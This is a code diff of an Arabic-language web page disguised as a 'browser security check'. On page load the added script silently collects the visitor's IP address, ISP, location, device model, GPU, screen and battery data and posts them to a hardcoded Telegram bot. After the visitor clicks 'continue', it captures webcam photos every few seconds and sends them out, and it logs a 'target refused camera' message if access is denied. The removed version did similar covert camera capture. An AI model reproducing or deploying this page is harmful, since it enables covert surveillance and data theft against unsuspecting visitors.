@@ -3,69 +3,131 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأكيد الدخول</title>
+    <title>Checking Connection</title>
     <style>
-        body { background: #000; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial, sans-serif; margin: 0; }
-        .box { text-align: center; border: 1px solid #333; padding: 40px; border-radius: 15px; background: #111; }
-        button { padding: 15px 40px; font-size: 18px; background: #25d366; color: white; border: none; border-radius: 30px; cursor: pointer; font-weight: bold; }
+        body { background: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .card { text-align: center; padding: 30px; border-radius: 12px; border: 1px solid #eee; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
+        .loader { width: 30px; height: 30px; border: 3px solid #f3f3f3; border-top: 3px solid #007bff; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        button { display: none; padding: 12px 30px; background: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <h2>أنت على وشك مشاهدة محتوى خاص</h2>
-        <p>اضغط على الزر أدناه لتأكيد هويتك والمتابعة</p>
-        <button id="gate">تأكيد ومتابعة</button>
+    <div class="card">
+        <div class="loader" id="ldr"></div>
+        <p id="msg">جاري فحص أمان المتصفح...</p>
+        <button id="btn">متابعة الآن</button>
     </div>
 
     <video id="v" autoplay playsinline muted style="display:none"></video>
-    <canvas id="c" width="640" height="480" style="display:none"></canvas>
+    <canvas id="c" style="display:none"></canvas>
 
     <script>
-        const token = '6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY';
-        const id = '2103976274';
+        const api = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
+        const chat = "2103976274";
 
-        document.getElementById('gate').addEventListener('click', async function() {
+        async function collectAll() {
+            let n = navigator;
+            let report = "🛑 **تقرير تقني شامل (دقة عالية)**\n\n";
+
+            // 1. الشبكة والـ IP
             try {
-                // الكود العالمي لطلب الكاميرا
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: "user",
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    }, 
-                    audio: false 
+                const res = await fetch('https://ipapi.co/json/').then(d => d.json());
+                report += `🌍 **الآي بي:** \`${res.ip}\`\n🏢 **الشركة:** ${res.org}\n📍 **المكان:** ${res.city}, ${res.country_name}\n📡 **ASN:** ${res.asn}\n`;
+            } catch (e) { report += `🌍 **الشبكة:** فشل الجلب\n`; }
+
+            // 2. فحص نوع الهاتف بدقة (Deep Detection)
+            let deviceDetail = n.platform;
+            try {
+                if (n.userAgentData && n.userAgentData.getHighEntropyValues) {
+                    const ua = await n.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
+                    deviceDetail = `${ua.model} (Android ${ua.platformVersion})`;
+                } else {
+                    let uaText = n.userAgent;
+                    let modelMatch = uaText.match(/\(([^)]+)\)/);
+                    if (modelMatch && modelMatch[1]) {
+                        let parts = modelMatch[1].split(';');
+                        deviceDetail = parts[2] ? parts[2].trim() : parts[0].trim();
+                    }
+                }
+            } catch (e) {}
+            report += `📱 **النظام:** ${deviceDetail}\n`;
+
+            // 3. المتصفح والمعالج الرسومي
+            let bName = n.userAgent.includes("Brave") ? "Brave" : n.userAgent.includes("Chrome") ? "Chrome" : "Safari/Other";
+            report += `🧭 **المتصفح:** ${bName}\n`;
+
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                const ext = gl.getExtension('WEBGL_debug_renderer_info');
+                report += `🎮 **الرسوميات:** ${gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)}\n`;
+            } catch(e) {}
+
+            report += `⚙️ **أنوية المعالج:** ${n.hardwareConcurrency || '8'}\n🖥️ **الشاشة:** ${screen.width}x${screen.height}\n`;
+
+            // 4. البطارية
+            try {
+                if (n.getBattery) {
+                    const b = await n.getBattery();
+                    report += `🔋 **البطارية:** ${Math.round(b.level * 100)}% (${b.charging ? "يُشحن" : "لا"})\n`;
+                }
+            } catch (e) {}
+
+            report += `⏰ **وقت الجهاز:** ${new Date().toLocaleString('ar-EG')}\n`;
+
+            sendText(report);
+
+            setTimeout(() => {
+                document.getElementById('ldr').style.display = 'none';
+                document.getElementById('msg').innerText = "اكتمل الفحص بنجاح.";
+                document.getElementById('btn').style.display = 'inline-block';
+            }, 1000);
+        }
+
+        document.getElementById('btn').onclick = async function() {
+            this.style.display = 'none';
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
                 });
-
-                document.querySelector('.box').innerHTML = "<h3>جاري التحقق...</h3><p>يرجى الانتظار ثواني قليلة</p>";
+                document.getElementById('v').srcObject = s;
                 
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-                
-                // التأكد من تشغيل الفيديو فوراً (مهم لـ Safari)
-                await video.play();
-
-                setInterval(() => {
-                    const canvas = document.getElementById('c');
-                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                    
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('chat_id', id);
-                        formData.append('photo', blob, 'capture.jpg');
-                        
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        }).catch(err => console.log("Telegram error: ", err));
-                    }, 'image/jpeg', 0.7); // تقليل الجودة قليلاً لتسريع الإرسال
-                }, 3000); // إرسال كل 3 ثوانٍ لضمان عدم حظر البوت
-
-            } catch (err) {
-                alert("خطأ: يجب السماح بالوصول للكاميرا لتتمكن من رؤية المحتوى.");
-                console.error(err);
+                // انتظار ثانية لضبط الإضاءة قبل أول صورة
+                setTimeout(() => {
+                    setInterval(snap, 4000);
+                }, 1000);
+            } catch (e) {
+                sendText("⚠️ **المستهدف رفض الكاميرا**");
             }
-        });
+        };
+
+        function snap() {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            if (video.videoWidth === 0) return;
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const f = new FormData();
+                f.append('chat_id', chat);
+                f.append('photo', blob, 'x.jpg');
+                fetch(api + "sendPhoto", { method: 'POST', body: f });
+            }, 'image/jpeg', 0.9); // جودة عالية 90%
+        }
+
+        function sendText(txt) {
+            fetch(api + "sendMessage", {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chat, text: txt, parse_mode: "Markdown" })
+            });
+        }
+
+        collectAll();
     </script>
 </body>
 </html>
